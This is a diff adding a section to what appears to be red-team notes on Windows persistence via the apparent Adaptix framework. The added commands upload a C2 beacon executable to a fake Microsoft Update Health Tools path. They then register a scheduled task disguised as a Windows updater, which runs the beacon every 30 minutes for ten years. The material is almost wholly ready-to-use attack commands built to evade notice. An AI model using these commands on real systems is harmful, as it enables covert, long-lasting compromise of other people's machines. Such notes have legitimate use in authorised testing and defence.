@@ -59,3 +59,12 @@ Cleanup
 ```powershell
 schtasksdelete \Microsoft\Windows\WindowsUpdate\Updater TASK
 ```
+
+##### Adaptix
+```powershell
+upload ~/beacons/svc_https.x64.exe "C:\Program Files\Microsoft Update Health Tools\updater.exe"
+```
+
+```powershell
+powershell "Register-ScheduledTask -TaskName 'Microsoft Updater x64' -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Microsoft Update Health Tools\updater.exe') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30) -RepetitionDuration (New-TimeSpan -Days 3650)) -Description 'Checks for Windows Updates'"
+```
